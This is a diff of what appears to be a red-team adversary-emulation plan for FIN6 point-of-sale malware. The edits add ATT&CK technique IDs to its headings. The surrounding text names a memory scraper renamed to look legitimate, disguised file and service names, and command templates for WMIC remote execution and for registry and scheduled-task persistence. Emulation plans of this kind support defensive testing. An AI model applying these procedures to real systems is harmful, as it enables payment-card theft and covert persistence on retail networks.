@@ -16,13 +16,13 @@ The lateral movement described herein describes lateral movement to systems of i
 
 The operational capability we will be emulating for this scenario is PoS malware.  You are encouraged to use a memory scraper of your choosing.  We have opted to use [mem_scraper](https://github.com/Shellntel/scripts/blob/master/mem_scraper.ps1).  This PowerShell script continuously dumps a process's memory and subsequently scrapes it for track data.  So as to remain operationally representative (name-wise), we used PS2EXE to compile the script into Assistant32.exe.<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup>
 
-Additional file names used by FIN6 include:<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>
+Additional file names (T1036.005) used by FIN6 include:<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>
 
 ```sh
 logmesvc.exe, ttfmgr.exe, powershell.exe, dspsvc.exe, logmeinlauncher.exe, and POSreport.exe, PnPXAssoc.exe
 ```
 
-Additional service names used by FIN6 in persisting PoS malware:<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>
+Additional service names (T1036.004) used by FIN6 in persisting PoS malware:<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>
 
 ```sh
 #{AV} Management Instrumentation, BFHlpr / Base Filtering Helper, hdmsv c/ Windows Hardware Management Driver, TrueType Fonts Management Service, and LogMeInServer
@@ -82,7 +82,7 @@ Example: wmic /node:"192.168.101.1" process call create "c:\windows\temp\Assista
 
 #### Registry Run Keys (T1547.001)
 
-##### FIN6 Procedure - DLL
+##### FIN6 Procedure (T1218.001) - DLL
 
 ```sh
 "C:\Windows\System32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v #{ } /t REG_SZ /d #{ } "C:\#{ },#{ } /f
@@ -100,7 +100,7 @@ Example: "C:\Windows\System32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows\Curr
 
 Scheduled Task (T1053.005)
 
-##### FIN6 Procedure - DLL
+##### FIN6 Procedure (T1218.001) - DLL
 
 ```sh
 "C:\Windows\System32\schtasks.exe" /create /tn #{ } /tr "rundll32.exe "C:\#{ }",#{ }" /sc #{ } /ru System
